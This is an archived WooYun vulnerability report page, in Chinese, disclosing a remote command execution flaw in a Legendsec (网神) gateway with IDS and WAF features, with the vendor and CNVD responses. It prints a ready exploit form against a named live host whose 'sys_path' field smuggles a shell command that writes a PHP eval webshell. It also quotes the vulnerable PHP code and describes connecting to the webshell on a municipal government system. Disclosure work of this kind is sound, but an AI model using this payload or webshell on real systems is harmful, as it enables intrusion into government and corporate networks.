@@ -1,0 +1,268 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[再浅谈内网安全]--网神某带ids,waf网关设备完控0day又一枚  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[再浅谈内网安全]--网神某带ids,waf网关设备完控0day又一枚  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/紫梦芊">紫梦芊</a> 
+</li><li>提交时间：		2013-07-01 11:51</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-07-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-07-05：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-08：	细节向第三方安全合作伙伴开放<br/>
+									2013-07-15：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-25：	细节向普通白帽子公开<br/>
+									2013-08-14：	细节向实习白帽子公开<br/>
+									2013-09-29：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">之前发布的国内外VPN网关0day包括了网神 现在再爆他们带ids和waf版本远程命令执行的0day一枚<br />
+<br />
+问题很普通。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">话不多说直接上0day.<br />
+<br />
+</p><pre><code>&lt;form action=&quot;https://221.202.118.50/admin/ids/waf_update.php&quot; method=&quot;post&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;uptype&quot; value=&quot;1&quot;&gt;<br />
+&lt;input type=&quot;hidden&quot; name=&quot;sys_path&quot; value=&quot;http://update.cisco.com/tmp.bin -O /data/upload/__ids_up__.bin || echo &#039;&lt;? eval($_POST[cmd])?&gt;&#039; &gt;/ssl/www/bug2.php ||whoami &quot;&gt;<br />
+&lt;input type=&quot;submit&quot; name=&quot;Submit&quot;&gt;<br />
+&lt;/form&gt;</code></pre><p class='detail'><br />
+<br />
+221.202.118.50 是葫芦岛市绩效考核系统 这个应该是网神VPN最新版本 感觉用户体验还不赖<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+来看看问题出在哪儿<br />
+<br />
+</p><pre><code>include_once &quot;management/system.php&quot;;<br />
+include_once &quot;management/ids.php&quot;;<br />
+<br />
+$uptype =1;<br />
+if ($_FILES[&#039;ids_file&#039;] || isset($_POST[&quot;sys_path&quot;])) {<br />
+	$uptype = $_POST[&quot;uptype&quot;];<br />
+	if($_POST[&quot;uptype&quot;] == 2){<br />
+		$file_size = $_FILES[&#039;ids_file&#039;][&#039;size&#039;];<br />
+		$file_type = $_FILES[&#039;ids_file&#039;][&#039;type&#039;];	<br />
+		$temp_name = $_FILES[&#039;ids_file&#039;][&#039;tmp_name&#039;];<br />
+		$file_name = $_FILES[&#039;ids_file&#039;][&#039;name&#039;];<br />
+		$file_name = str_replace(&quot;\\&quot;,&quot;&quot;,$file_name);<br />
+		$file_name = str_replace(&quot;&#039;&quot;,&quot;&quot;,$file_name);<br />
+		$file_name = str_replace(&quot; &quot;,&quot;&quot;,$file_name);<br />
+<br />
+		$file_path = $CFG_UPLOAD_PATH.&quot;__ids_up__.bin&quot;;<br />
+<br />
+		//File Name Check<br />
+		if ( $file_name == &quot;&quot; ) { <br />
+			echo &quot;Invalid File Name Specified&quot;;<br />
+			return;<br />
+		}<br />
+		$result = move_uploaded_file($temp_name, $file_path);<br />
+	}else{<br />
+		$file_path = &quot;/data/upload/__ids_up__.bin&quot;;<br />
+		$url = trim($_POST[&quot;sys_path&quot;]);<br />
+		$url =&quot;http://&quot;.$url;<br />
+		system(&quot;wget -t 3 $url -O $file_path &quot;);	<br />
+	}<br />
+	$SM = new IDSManager;<br />
+	$V = $SM-&gt;snort_update($ticket,$file_path);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+看代码可以看出是能从web上传 也可以从sys_path参数获取到的地址下载 然后进行snort的升级<br />
+<br />
+用system(wget)进行的下载 进行升级钱应该有个ticket判断 这个相当于session或token <br />
+<br />
+<br />
+<br />
+还有一要素 management/system.php 和 management/ids.php 是没有在当前目录下的 所以执行0day后出现如此<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/011119148d2480cfbe4e4372fb0899cd4d81a39b.jpg" target="_blank"><img src="../images/011119148d2480cfbe4e4372fb0899cd4d81a39b.jpg" alt="ws44.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+看到这个Fatal error 很多人瞬间放弃 也许他们测试也测过这里 但是 我们的system在31行之前,无影响(这就是脚本语言的好处之一,运维可以说是噩梦之一,呵呵) <br />
+<br />
+菜刀一连<br />
+<br />
+</p><p class="detail"><a href="../images/01112430cd5544143b0b0be0e9de23d77b65cff7.jpg" target="_blank"><img src="../images/01112430cd5544143b0b0be0e9de23d77b65cff7.jpg" alt="vvv.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+还有些泄漏的源码 看来应该不大重要 但是不应该放在web目录下<br />
+<br />
+</p><p class="detail"><a href="../images/011126271d8a54a7ef73029a2c16135e0ef4981c.jpg" target="_blank"><img src="../images/011126271d8a54a7ef73029a2c16135e0ef4981c.jpg" alt="vvv2.jpg" width="600"/></a></p><p class="detail"> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">https://221.202.118.50/bug2.php   cmd<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/011127328d97477f12e18c9752f16579c032af70.jpg" target="_blank"><img src="../images/011127328d97477f12e18c9752f16579c032af70.jpg" alt="ddd.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+葫芦岛市的用户不少 我在这里抛个砖,引点大家的玉<br />
+<br />
+</p><p class="detail"><a href="../images/01112948f1b1481446e67d5b5f581e5d2b3f36a7.jpg" target="_blank"><img src="../images/01112948f1b1481446e67d5b5f581e5d2b3f36a7.jpg" alt="ws1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这个...完全只防了正规途径啊..<br />
+<br />
+</p><p class="detail"><a href="../images/011130013861206fee5a6f1dc8c1074200ac34f7.jpg" target="_blank"><img src="../images/011130013861206fee5a6f1dc8c1074200ac34f7.jpg" alt="ws2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这个...依然<br />
+<br />
+</p><p class="detail"><a href="../images/01113132e62271bca579eaf27ee9c0efcbdb8552.jpg" target="_blank"><img src="../images/01113132e62271bca579eaf27ee9c0efcbdb8552.jpg" alt="ws3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+这个NAT配置是个很方便的东西 方便对iptables不熟悉的朋友进行内网渗透<br />
+<br />
+<br />
+<br />
+PS:其实当前有不少数SOC以及IDS等防御方式不够完善,大多只对正规途径来的用户行为进行了审计防范,一些另类的方式或是不常用的方式并不审计,或审计较弱,还有普遍现象是大量无用信息没有归纳挖掘,网络管理员也懒得看了。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">找乌云官方进行乌云众测<br />
+<br />
+(PS:你们竞争对手sinfor也做了众测) </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/紫梦芊" title="紫梦芊">紫梦芊</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-027324" title="[再浅谈内网安全]--网神某带ids,waf网关设备完控0day又一枚">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：17 </p>
+													<p class="detail">确认时间：2013-07-05 00:04</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述情况，同时对于该设备进行分析后，检测发现若干暴露在互联网上的实例，可以初步确认通用性。拟由CNCERT直接联系厂商处置，同时将继续检测互联网上可能涉及政府和重要信息系统部门的事件，后续加强处置。<br />
+<br />
+rank 17<br />
+<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="27324";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
